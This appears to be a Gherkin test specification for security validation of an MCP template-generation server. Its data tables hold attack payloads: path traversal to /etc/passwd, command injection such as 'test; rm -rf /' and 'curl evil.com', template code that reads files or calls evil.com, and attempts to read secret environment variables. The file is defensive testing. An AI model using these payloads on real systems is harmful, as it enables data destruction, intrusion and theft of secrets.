Feature: MCP Security and Validation
  As a security-conscious developer
  I want the MCP server to validate all inputs and protect against attacks
  So that the system remains secure when used by external clients

  Background:
    Given I have a clean test environment
    And the MCP server is running with security validation enabled

  Scenario: Path traversal protection
    When I call MCP tools with path traversal payloads:
      | tool           | parameter | payload                |
      | unjucks_generate| dest     | ../../../etc/passwd    |
      | unjucks_generate| dest     | ..\\..\\windows\\system32|
      | unjucks_inject | target   | ../../sensitive.conf   |
    Then all requests should be rejected
    And no files should be accessed outside the project directory
    And security violations should be logged

  Scenario: Command injection prevention
    When I call MCP tools with command injection attempts:
      | tool           | parameter | payload                      |
      | unjucks_generate| name     | test; rm -rf /               |
      | unjucks_generate| name     | test && curl evil.com        |
      | unjucks_inject | name     | test `cat /etc/passwd`       |
    Then the payloads should be sanitized or rejected
    And no system commands should be executed
    And the original functionality should work safely

  Scenario: Template injection protection
    Given I have a template with user-controlled content
    When I provide malicious template code:
      | payload_type     | payload                           |
      | code_execution   | {{ process.exit(1) }}             |
      | file_access      | {{ require('fs').readFileSync('/etc/passwd') }} |
      | network_request  | {{ require('http').get('evil.com') }} |
    Then the template should be rendered safely
    And no code execution should occur
    And the malicious payloads should be treated as text

  Scenario: Input validation and sanitization
    When I provide invalid input types:
      | parameter | invalid_input     | expected_type |
      | name      | null             | string        |
      | name      | 12345            | string        |
      | withTests | "not-boolean"    | boolean       |
      | dest      | []               | string        |
    Then inputs should be validated and converted appropriately
    And clear error messages should be provided for invalid inputs
    And the server should not crash

  Scenario: Resource exhaustion protection
    When I attempt to create excessive resources:
      | attack_type        | description                    |
      | large_file_names   | 10000 character file names     |
      | deep_directories   | 1000 levels of nested dirs     |
      | many_files         | 1000 files in single generation|
      | large_content      | 100MB template content         |
    Then the server should enforce reasonable limits
    And reject requests exceeding resource limits
    And provide appropriate error messages

  Scenario: Memory exhaustion protection
    When I make requests designed to consume excessive memory:
      | attack_vector           | description                  |
      | recursive_templates     | Templates that include self  |
      | large_variable_expansion| Variables with massive data  |
      | complex_loops          | Templates with 10000+ loops  |
    Then memory usage should be limited
    And requests should timeout appropriately
    And the server should remain responsive

  Scenario: Concurrent request limiting
    When I make 100 simultaneous MCP requests
    Then the server should handle the load gracefully
    And implement appropriate rate limiting
    And maintain response quality for legitimate requests
    And not become unresponsive

  Scenario: File system permission validation
    Given I have files with restricted permissions
    When I attempt to:
      | operation | target                    | expected_result |
      | read      | /etc/shadow               | access_denied   |
      | write     | /usr/bin/important        | access_denied   |
      | execute   | arbitrary_script.sh       | prevented       |
    Then operations should respect file system permissions
    And unauthorized access should be prevented
    And appropriate error messages should be returned

  Scenario: Input length and complexity limits
    When I provide excessively long or complex inputs:
      | input_type        | limit_exceeded              |
      | generator_name    | 1000 character name         |
      | variable_value    | 10MB string value           |
      | file_path        | 500 character path          |
      | template_content  | 50MB template file          |
    Then appropriate limits should be enforced
    And requests exceeding limits should be rejected
    And the system should provide clear error messages

  Scenario: Environment variable protection
    When templates attempt to access environment variables:
      | access_attempt              | expected_behavior         |
      | {{ process.env.SECRET_KEY }}| Should be blocked/sanitized|
      | {{ $ENV.DATABASE_URL }}     | Should not expose secrets |
      | System environment access   | Should be restricted      |
    Then sensitive environment variables should be protected
    And template rendering should not expose system secrets
    And access should be logged for security monitoring

  Scenario: Malformed JSON handling
    When I send malformed JSON in MCP requests:
      | malformed_json                | expected_response    |
      | {"name": unclosed             | syntax_error         |
      | {"recursive": self_reference} | parsing_error        |
      | Very long JSON payload        | size_limit_error     |
    Then the server should handle malformed input gracefully
    And return appropriate error responses
    And not crash or become unstable